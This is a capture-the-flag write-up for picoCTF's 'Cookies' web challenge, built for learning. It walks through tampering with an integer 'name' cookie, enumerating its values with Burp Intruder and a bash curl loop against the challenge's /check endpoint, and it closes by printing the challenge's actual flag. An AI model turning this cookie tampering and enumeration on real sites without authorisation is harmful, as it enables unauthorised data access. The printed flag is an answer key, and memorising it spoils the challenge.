# 🍪 Cookies — picoCTF

**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF  
**Challenge:** Cookies

---

## 📌 Challenge Description

> Who doesn't love cookies? Try to figure out the best one.

The challenge provides a web application where the server uses a cookie named `name`.

The initial cookie was:

```text
name=-1
```

Changing this cookie value produced different cookie responses.

The goal was to discover the correct cookie value that reveals the flag.

---

## 🔎 Step 1 — Inspect the Cookie

Using the browser's Developer Tools:

**Application → Storage → Cookies**

I found:

```text
Cookie Name: name
Cookie Value: -1
```

The page reported:

```text
That doesn't appear to be a valid cookie.
```

This suggested that the `name` cookie was being used by the server to select a value.

---

## 🧪 Step 2 — Test Different Cookie Values

I manually changed the cookie:

```text
name=-1
```

to different integer values:

```text
name=0
name=1
name=2
name=3
...
```

Different values produced different cookie flavors.

For example:

```text
name=7
```

returned:

```text
That is a cookie! Not very special though...
```

and:

```text
I love sugar cookies!
```

This confirmed that the cookie value was influencing server-side behavior.

---

## 🕵️ Step 3 — Analyze the HTTP Request

Using Burp Suite, the request looked like:

```http
GET / HTTP/1.1
Host: wily-courier.picoctf.net:PORT
Cookie: name=7
```

The server responded with:

```http
HTTP/1.1 302 FOUND
Location: /check
```

This showed that `/` redirects to `/check`.

---

## 🔬 Step 4 — Inspect `/check`

I changed the request from:

```http
GET /
```

to:

```http
GET /check
```

while keeping the cookie:

```http
Cookie: name=7
```

The server then returned:

```http
HTTP/1.1 200 OK
```

with the response:

```text
That is a cookie! Not very special though...

I love sugar cookies!
```

This confirmed that `/check` was the endpoint responsible for checking the selected cookie.

---

## 🚀 Step 5 — Automate Cookie Enumeration

Manually testing every value would be inefficient.

I used Burp Intruder to automate the enumeration.

### Intruder Configuration

**Attack type:**

```text
Sniper
```

The cookie value was marked as the payload position:

```http
Cookie: name=§-1§
```

The payload was configured as sequential numbers:

```text
From: 0
To: 100
Step: 1
```

Burp then tested:

```text
name=0
name=1
name=2
name=3
...
name=100
```

---

## 📊 Step 6 — Analyze the Results

The Intruder results showed an important pattern.

Values up to `28` returned:

```text
HTTP 200
```

while values starting from `29` returned:

```text
HTTP 302
```

For example:

```text
Payload    Status    Length
24         200       2051
25         200       2054
26         200       2052
27         200       2060
28         200       2070
29         302        599
30         302        599
```

This indicated that the valid cookie indexes were within:

```text
0–28
```

---

## 💻 Step 7 — Automate the Final Check

Instead of inspecting every Burp response manually, I used `curl` to test the valid range:

```bash
for i in $(seq 0 28); do
    echo "===== COOKIE $i ====="
    curl -s -H "Cookie: name=$i" \
    http://wily-courier.picoctf.net:PORT/check |
    grep -E "I love|picoCTF"
done
```

This automatically tested every valid cookie index and filtered the response for useful information.

The correct cookie value produced the flag.

---

## 🚩 Flag

```text
picoCTF{YOUR_FLAG_HERE}
```

---

## 🧠 What I Learned

### 1. Cookies can influence server-side behavior

A cookie isn't necessarily just a session identifier.

In this challenge:

```text
name=7
```

was used by the application to select a particular cookie.

---

### 2. Client-controlled values should not be trusted

The server accepted an integer supplied directly by the client.

Changing:

```text
name=0
```

to:

```text
name=1
```

changed the application's behavior.

This demonstrates the danger of trusting client-controlled input.

---

### 3. Enumeration can reveal hidden application data

By incrementing the cookie value, it was possible to enumerate the valid indexes.

Instead of guessing the "best" cookie, automation allowed us to systematically test the available values.

---

### 4. Burp Intruder is useful for parameter enumeration

Burp Intruder can automatically modify a selected part of an HTTP request.

In this case:

```http
Cookie: name=§-1§
```

allowed the cookie value to be replaced with a sequence of numbers.

---

## 🛠️ Tools Used

* Browser Developer Tools
* Burp Suite
* Burp Intruder
* Burp Repeater
* curl
* Linux terminal

---

## 🎯 Key Takeaway

The main vulnerability was **trusting a client-controlled cookie value to select server-side data**.

The attack methodology was:

```text
Inspect Cookie
      ↓
Modify Cookie Value
      ↓
Observe Different Responses
      ↓
Discover /check Endpoint
      ↓
Enumerate Cookie Values
      ↓
Identify Valid Range
      ↓
Automate Testing
      ↓
Retrieve Flag
```

---

**Flag:** `picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}`
